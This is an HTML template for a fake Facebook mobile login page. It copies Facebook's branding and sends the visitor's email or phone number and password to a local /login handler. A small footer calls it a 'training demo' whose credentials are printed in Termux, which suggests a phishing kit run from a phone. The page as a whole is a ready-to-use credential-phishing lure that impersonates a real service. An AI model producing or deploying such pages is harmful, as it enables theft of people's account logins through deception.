<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Facebook</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}
body {
    background: #fff;
    color: #1c1e21;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}
.top-banner {
    background: #f0f2f5;
    padding: 10px 16px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px;
    color: #1877f2;
    border-bottom: 1px solid #dddfe2;
}
.header {
    padding: 12px 16px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.back-btn {
    font-size: 24px;
    color: #1c1e21;
    text-decoration: none;
}
.lang {
    font-size: 15px;
    color: #1c1e21;
}
.main {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 20px 16px 40px;
}
.fb-logo {
    width: 62px;
    height: 62px;
    background: #1877f2;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 30px 0 40px;
}
.fb-logo span {
    color: white;
    font-size: 42px;
    font-weight: bold;
    line-height: 1;
    margin-top: -4px;
}
.form {
    width: 100%;
    max-width: 400px;
}
input {
    width: 100%;
    padding: 14px 16px;
    margin-bottom: 12px;
    border: 1px solid #dddfe2;
    border-radius: 24px;
    font-size: 17px;
    background: #fff;
    outline: none;
}
.login-btn {
    width: 100%;
    padding: 14px;
    background: #1877f2;
    color: white;
    border: none;
    border-radius: 24px;
    font-size: 18px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
}
.forgot {
    display: block;
    text-align: center;
    margin: 20px 0 30px;
    color: #1c1e21;
    font-size: 15px;
    text-decoration: none;
}
.create-btn {
    width: 100%;
    padding: 12px;
    background: transparent;
    color: #1877f2;
    border: 1.5px solid #1877f2;
    border-radius: 24px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
}
.meta {
    margin-top: 50px;
    text-align: center;
    color: #65676b;
    font-size: 15px;
}
.training-notice {
    position: fixed;
    bottom: 10px;
    left: 0;
    right: 0;
    text-align: center;
    font-size: 11px;
    color: #8a8d91;
    background: rgba(255,255,255,0.9);
    padding: 6px;
}
</style>
</head>
<body>
<div class="top-banner">Get Facebook for Android and browse faster.</div>
<div class="header">
    <a href="/auth-options" class="back-btn">←</a>
    <div class="lang">English (US)</div>
</div>
<div class="main">
    <div class="fb-logo"><span>f</span></div>
    <form class="form" method="POST" action="/login">
        <input type="text" name="email" placeholder="Mobile number or email" required autocomplete="username">
        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
        <button type="submit" class="login-btn">Log in</button>
    </form>
    <a href="#" class="forgot">Forgot password?</a>
    <button class="create-btn">Create new account</button>
    <div class="meta"><span>∞</span> Meta</div>
</div>
<div class="training-notice">TRAINING DEMO • Credentials only printed in Termux</div>
</body>
</html>
